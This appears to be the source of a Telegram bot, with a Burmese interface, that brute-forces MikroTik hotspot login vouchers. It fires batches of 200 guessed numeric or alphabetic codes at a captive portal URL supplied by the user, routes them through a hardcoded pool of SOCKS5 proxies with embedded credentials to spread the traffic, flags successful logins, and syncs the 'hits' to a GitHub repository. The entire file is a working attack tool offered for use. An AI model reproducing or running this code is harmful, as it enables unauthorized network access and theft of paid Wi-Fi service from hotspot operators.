const { Telegraf, Markup } = require('telegraf');
const http = require('http');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

const BOT_TOKEN = 'Your_Bot_Token';
const GITHUB_TOKEN = 'Your_Github_Token';
const ADMIN_ID = "8702460710";
const REPO_OWNER = "repo";
const REPO_NAME = "Lord_of_barkness";

const bot = new Telegraf(BOT_TOKEN);
const userData = {};
const scanTasks = {};
const successMessages = {};
const successTexts = {};
const retryCounts = {};

const CONCURRENCY = 200;
let successQueue = [];

// ==============================================================================
//  STATIC PROXIES POOL (HARDCODED)
// ==============================================================================
const PROXY_POOL = [
    "socks5://wGai8DyPSNeQlAd:8WaUgqvJvWAyqev@74.122.59.173:46755",
    "socks5://tzXeza38EipmXsG:wCBAzafvMmK8Ga1@45.45.197.176:43067",
    "socks5://5kIBW3bsPzzJ1lj:aJRPb2VJSRZAguM@205.196.9.184:45587",
    "socks5://rx5pJgxEHXd0o7x:uz24glKbgeUUImN@205.196.10.28:44219",
    "socks5://O6OAD3lumn3SgnM:Jxu2Pjh5dNCm5rt@205.196.8.80:46631",
    "socks5://IjmCt2FqgNmztJy:YsI0sZkXYck4MUX@205.196.9.107:47173",
    "socks5://PvXLEKn1kZVQJEp:jFtdLOBu9aKQHU9@205.196.8.196:46312",
    "socks5://D2AiNwOf6EFrXbB:IMgUdQgGAYDBLug@205.196.8.138:45734",
    "socks5://hnpI7ZMjgezqECv:ccOXiU2p2WrUxM1@205.196.8.171:42890",
    "socks5://O0cHRJA8rejuyEu:2nb8OXLrQ2YmZ4Y@198.143.13.145:45652",
    "socks5://8NTXIon7t1XoHvH:U6EzSoBJ1AA7K8V@74.122.56.209:44662",
    "socks5://u5dJ1AQnqvl6d0m:iI8sWqq113npBkq@205.196.9.189:48881",
    "socks5://0JNnXAruZUVbLWa:rlGpLEsoZq95kz7@205.196.11.212:48256",
    "socks5://nQ2EPjxw0aXDlw1:N2H6w5ZOxjIdcyT@205.196.8.33:47226",
    "socks5://g1EtCz12NSazZUN:ihktMqFAUIwmjLW@205.196.10.37:45610",
    "socks5://KmjSGD5Cu84yDke:2IBX5Q5iDOI7cQG@5.102.107.77:44792",
    "socks5://BajD8aFKbyV27V4:UbCDUeFAsBtDWWd@91.192.242.165:42355",
    "socks5://pfxS7n8VqHOXZz6:fwu0UcCxNwXvBlm@91.192.241.153:42838",
    "socks5://aWpmZG6KreyuaLa:BrsEdu51jdDLaQC@176.46.128.119:46182",
    "socks5://TRGTNayR3wgA9Xa:AFsOecsUEE6VXzR@203.166.138.243:44770",
    "socks5://hrTWLMPEBYFVrVW:9NEf7wIACJmzqwa@203.166.138.96:44864",
    "socks5://MnOiyGEqDUjArYR:zHqarIcDRmUmN3S@203.166.138.47:49826",
    "socks5://ZRtgFGWj9eck3fg:9L2DqsPsYziYWBC@92.113.90.10:43237",
    "socks5://NsehLJpU1IjEsoj:lFzK5KeIJYSLrCj@176.46.128.106:43682",
    "socks5://dxQ2u8jI93gSBYr:1jo8RdyC79HAmia@176.46.128.24:47379",
    "socks5://jarth7WMduhMDQJ:xLFY9Hmg2wH405b@203.166.138.213:46127",
    "socks5://Qhuk3p7bWfpkCzc:Vq16jyIYuvHp11B@203.166.138.221:44541",
    "socks5://ZoEnJJ7mqrTLjB1:JmqNCVlCQom0s0b@92.113.90.156:41366"
];

let badProxies = new Set();

function getNextProxy() {
    let valid = PROXY_POOL.filter(p => !badProxies.has(p));
    if (valid.length === 0) {
        badProxies.clear();
        valid = PROXY_POOL;
    }
    return valid[Math.floor(Math.random() * valid.length)];
}

// ==============================================================================
//  WEB SERVER FOR 24/7 UPTIME
// ==============================================================================
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('⚔️ MIKROTIK MATRIX CORE ACTIVE 24/7 (JS) ⚔️');
});
const PORT = process.env.PORT || 8099;
server.listen(PORT, () => {
    console.log(`[WebServer] တက်လာပါပြီ Port ${PORT} မှာ အလုပ်လုပ်နေပါပြီ...`);
});

// ==============================================================================
//  GITHUB STORAGE SYNC
// ==============================================================================
async function getFileContent(path) {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`;
        const res = await axios.get(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
        const content = Buffer.from(res.data.content, 'base64').toString('utf8');
        return [JSON.parse(content), res.data.sha];
    } catch (e) {
        return [{}, null];
    }
}

async function updateFileContent(path, content, sha, message) {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`;
        const encoded = Buffer.from(JSON.stringify(content)).toString('base64');
        const payload = { message: message, content: encoded, sha: sha };
        const res = await axios.put(url, payload, {
            headers: { Authorization: `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' }
        });
        return res.data;
    } catch (e) {
        return null;
    }
}

// ==============================================================================
//  MYANMAR UI & INTERACTIVE KEYBOARDS
// ==============================================================================
function mainMenu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('🔑 ၁။ အတည်ပြုရန် (Key)', 'menu_key'), Markup.button.callback('📥 ၂။ ဂျိတ်ဝေးလင့်ထည့်ရန် (Input)', 'menu_input')],
        [Markup.button.callback('⚡ ၃။ စကင်န်စတင်ရန် (Scan)', 'menu_scan'), Markup.button.callback('🔄 ၄။ ဟစ်များကိုပြန်စစ်ရန် (Recheck)', 'menu_recheck')],
        [Markup.button.callback('📋 ၅။ သိမ်းဆည်းထားသောဟစ်များ (Result)', 'menu_result'), Markup.button.callback('⏹ ၆။ ရပ်တန့်ရန် (Stop)', 'menu_stop')],
        [Markup.button.callback('📊 ၇။ အခြေအနေ (Status)', 'menu_status'), Markup.button.callback('❓ ၈။ အသုံးပြုပုံလမ်းညွှန် (Help)', 'menu_help')]
    ]);
}

function scanModeMenu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('🩸 06-DIGIT (နံပါတ် ၆ လုံး)', 'scan_6'), Markup.button.callback('🩸 07-DIGIT (နံပါတ် ၇ လုံး)', 'scan_7')],
        [Markup.button.callback('🩸 08-DIGIT (နံပါတ် ၈ လုံး)', 'scan_8'), Markup.button.callback('🦇 06-ASCII LOWER (အင်္ဂလိပ်သေး)', 'scan_ascii')],
        [Markup.button.callback('☠️ CYBER CHAOS (အင်္ဂလိပ်+နံပါတ်)', 'scan_all'), Markup.button.callback('🔙 ပင်မမီနူးသို့ (Back)', 'menu_back')]
    ]);
}

bot.start(async (ctx) => {
    const welcomeText = (
        "╔═════════════════════════════════════╗\n" +
        "║     ⚔️ MIKROTIK WIFI BOT (JS) ⚔️    ║\n" +
        "╚═════════════════════════════════════╝\n\n" +
        "မြန်မာဘာသာဖြင့် အလွယ်တကူ အသုံးပြုနိုင်သော MikroTik စနစ် (Node.js)။\n" +
        "အောက်ပါ ခလုတ်များမှ တစ်ခုချင်း ရွေးချယ်အသုံးပြုပါ။"
    );
    await ctx.reply(welcomeText, { parse_mode: 'Markdown', ...mainMenu() });
});

bot.command('menu', async (ctx) => {
    await ctx.reply('📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_back', async (ctx) => {
    await ctx.editMessageText('📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_key', async (ctx) => {
    userData[ctx.chat.id] = {};
    await ctx.editMessageText('✅ **အတည်ပြုပြီးပါပြီ!**\nယခု ဆက်လက်၍ `/input` ဖြင့် MikroTik လင့်ခ် ထည့်ပါ။', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_input', async (ctx) => {
    await ctx.editMessageText('📥 **MikroTik လင့်ခ် ထည့်သွင်းခြင်း**\n\nပုံစံ- `/input http://skk.wifi/login?dst=...` ဟု ရိုက်ထည့်ပါ။', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_scan', async (ctx) => {
    if (!userData[ctx.chat.id]) userData[ctx.chat.id] = {};
    userData[ctx.chat.id].platform = 'mikrotik';
    await ctx.editMessageText('📜 **MikroTik စကင်န်မုဒ်ကို ရွေးချယ်ပါ:**', { parse_mode: 'Markdown', ...scanModeMenu() });
});

const handleScanMode = async (ctx, mode) => {
    const chatId = ctx.chat.id;
    if (!userData[chatId]) userData[chatId] = {};
    userData[chatId].scan_mode = mode;
    userData[chatId].platform = 'mikrotik';

    await ctx.editMessageText(`⚡ **စတင် စကင်န်ဖတ်နေပါပြီ...** Mode: \`${mode}\``, { parse_mode: 'Markdown', ...mainMenu() });
    runBruteforce(mode, chatId, userData[chatId].session_url, ctx);
};

bot.action('scan_6', (ctx) => handleScanMode(ctx, '6'));
bot.action('scan_7', (ctx) => handleScanMode(ctx, '7'));
bot.action('scan_8', (ctx) => handleScanMode(ctx, '8'));
bot.action('scan_ascii', (ctx) => handleScanMode(ctx, 'ascii-lower'));
bot.action('scan_all', (ctx) => handleScanMode(ctx, 'all'));

bot.action('menu_result', async (ctx) => {
    const [results] = await getFileContent('result.json');
    const chatIdStr = String(ctx.chat.id);
    if (results[chatIdStr] && results[chatIdStr].length > 0) {
        const codes = results[chatIdStr].join('\n');
        await ctx.editMessageText(`📋 **အောင်မြင်စွာ ရရှိထားသော ဟစ်များ:**\n\n${codes}`, { parse_mode: 'Markdown', ...mainMenu() });
    } else {
        await ctx.editMessageText('🖤 ယခုထိ ရှာဖွေတွေ့ရှိထားသော ကုဒ် မရှိသေးပါ။', { parse_mode: 'Markdown', ...mainMenu() });
    }
});

bot.action('menu_stop', async (ctx) => {
    const chatId = ctx.chat.id;
    if (scanTasks[chatId]) {
        scanTasks[chatId].stop = true;
    }
    await ctx.editMessageText('⏹ **အလုပ်လုပ်နေမှုကို ရပ်တန့်လိုက်ပါပြီ။**', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_status', async (ctx) => {
    if (String(ctx.chat.id) !== ADMIN_ID) return;
    const activeScans = Object.values(scanTasks).filter(t => !t.stopped).length;
    await ctx.reply(`📊 အလုပ်လုပ်နေသော စကင်န်အရေအတွက်: \`${activeScans}\` | Static Proxy ပမာဏ: \`${PROXY_POOL.length}\``, { parse_mode: 'Markdown', ...mainMenu() });
});

bot.action('menu_help', async (ctx) => {
    const helpText = (
        "📖 **မြန်မာဘာသာ အသုံးပြုပုံလမ်းညွှန်**\n\n" +
        "၁။ `/key` - စနစ်ကို စတင်အသုံးပြုရန် ခွင့်ပြုချက်ရယူပါ။\n" +
        "၂। `/input <url>` - MikroTik လင့်ခ်ကို ထည့်ပါ။\n" +
        "၃। `/scan` - စကင်န်ဖတ်မည့် ပုံစံကို ရွေးချယ်ပါ။\n" +
        "၄। `/result` - အောင်မြင်ထားသော ကုဒ်များကို ကြည့်ပါ။\n" +
        "၅। `/stop` - လုပ်ဆောင်ချက်ကို ရပ်ရန်။"
    );
    await ctx.editMessageText(helpText, { parse_mode: 'Markdown', ...mainMenu() });
});

bot.command('key', async (ctx) => {
    userData[ctx.chat.id] = {};
    await ctx.reply('✅ **ခွင့်ပြုချက် အောင်မြင်ပါသည်!** ဆက်လက်၍ `/input` ဖြင့် MikroTik လင့်ခ်ထည့်ပါ။', { parse_mode: 'Markdown', ...mainMenu() });
});

bot.command('input', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply('❌ **အသုံးပြုပုံ:** `/input http://skk.wifi/login?dst=...`', { parse_mode: 'Markdown', ...mainMenu() });
        return;
    }
    const url = args[1];
    userData[ctx.chat.id] = userData[ctx.chat.id] || {};
    userData[ctx.chat.id].session_url = url;
    await ctx.reply('✅ **လင့်ခ်ချိတ်ဆက်မှု အောင်မြင်ပါသည်!** `/scan` ဖြင့် စကင်န်စတင်ပါ။', { parse_mode: 'Markdown', ...mainMenu() });
});

// ==============================================================================
//  CODE GENERATION & BRUTEFORCE ENGINE
// ==============================================================================
function generateCode(mode, index, length) {
    if (mode === '6' || mode === '7') {
        return String(index).padStart(length, '0');
    }
    if (mode === '8') {
        return Math.floor(Math.random() * 100000000).toString().padStart(8, '0');
    }
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    if (mode === 'ascii-lower') {
        let res = '';
        for (let i = 0; i < 6; i++) res += chars[Math.floor(Math.random() * chars.length)];
        return res;
    }
    const allChars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let res = '';
    for (let i = 0; i < 6; i++) res += allChars[Math.floor(Math.random() * allChars.length)];
    return res;
}

async function performCheck(sessionUrl, code, chatId) {
    const proxyUrl = getNextProxy();
    let agent = null;
    if (proxyUrl) {
        if (proxyUrl.startsWith('socks')) {
            agent = new SocksProxyAgent(proxyUrl);
        } else {
            agent = new HttpsProxyAgent(proxyUrl);
        }
    }

    try {
        let targetUrl = sessionUrl;
        if (sessionUrl.includes('?')) {
            targetUrl = `${sessionUrl}&username=${code}`;
        } else {
            targetUrl = `${sessionUrl}?username=${code}`;
        }

        const res = await axios.get(targetUrl, {
            httpsAgent: agent,
            proxy: false,
            timeout: 8000,
            maxRedirects: 5,
            validateStatus: () => true
        });

        const respText = String(res.data).toLowerCase();
        if (respText.includes('status') || respText.includes('logged in') || respText.includes('logout') || respText.includes('you are logged')) {
            if (!successTexts[chatId]) successTexts[chatId] = [];
            successTexts[chatId].push(`🎫 \`${code}\` [MIKROTIK]`);
            successQueue.push({ chat_id: chatId, code: code });
            
            const codeLine = successTexts[chatId].join('\n');
            try {
                if (!successMessages[chatId]) {
                    const sent = await bot.telegram.sendMessage(chatId, `✅ **အောင်မြင်သော ဟစ်များ:**\n\n${codeLine}`, { parse_mode: 'Markdown', ...mainMenu() });
                    successMessages[chatId] = sent.message_id;
                } else {
                    await bot.telegram.editMessageText(chatId, successMessages[chatId], undefined, `✅ **အောင်မြင်သော ဟစ်များ:**\n\n${codeLine}`, { parse_mode: 'Markdown', ...mainMenu() });
                }
            } catch (e) {}
        }
    } catch (e) {
        if (proxyUrl) badProxies.add(proxyUrl);
    }
}

async function runBruteforce(mode, chatId, sessionUrl, ctx) {
    if (!sessionUrl) {
        await ctx.reply('⚠️ ကျေးဇူးပြု၍ `/input` ဖြင့် လင့်ခ်အရင်ထည့်ပါ။');
        return;
    }

    scanTasks[chatId] = { stop: false };
    let checked = 0;
    const length = parseInt(mode) || 6;
    const maxLimit = (mode === '6' || mode === '7') ? Math.pow(10, length) : 999999999;

    const progressMsg = await ctx.reply('🔮 စကင်န်ဖတ်ရန် အလုပ်သမားများကို စတင်နေပါပြီ...', { parse_mode: 'Markdown', ...mainMenu() });

    for (let i = 0; i < maxLimit; i++) {
        if (scanTasks[chatId] && scanTasks[chatId].stop) break;

        const batch = [];
        for (let b = 0; b < CONCURRENCY && i < maxLimit; b++, i++) {
            batch.push(generateCode(mode, i, length));
        }

        await Promise.all(batch.map(code => performCheck(sessionUrl, code, chatId)));
        checked += batch.length;

        if (checked % 1000 === 0) {
            try {
                await bot.telegram.editMessageText(
                    chatId,
                    progressMsg.message_id,
                    undefined,
                    `╔═════════════════════════════════════╗\n` +
                    `║    ⚔️ စကင်န်ဖတ်နေဆဲ (LIVE STATUS) ⚔️ ║\n` +
                    `╚═════════════════════════════════════╝\n` +
                    `📦 စစ်ဆေးပြီး : \`${checked.toLocaleString()}\`\n` +
                    `✅ တွေ့ရှိချက် : \`${(successTexts[chatId] || []).length}\``,
                    { parse_mode: 'Markdown', ...mainMenu() }
                );
            } catch (e) {}
        }
    }
}

// Background GitHub Sync Scheduler
setInterval(async () => {
    if (successQueue.length === 0) return;
    const items = [...successQueue];
    successQueue = [];
    try {
        const [results, sha] = await getFileContent('result.json');
        for (const item of items) {
            const cid = String(item.chat_id);
            if (!results[cid]) results[cid] = [];
            if (!results[cid].includes(item.code)) {
                results[cid].push(item.code);
            }
        }
        await updateFileContent('result.json', results, sha, 'Sync hits via Node.js');
    } catch (e) {}
}, 60000);

bot.launch();
console.log('[BotDaemon] Telegram Bot အောင်မြင်စွာ စတင်လိုက်ပါပြီ (Node.js)!');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
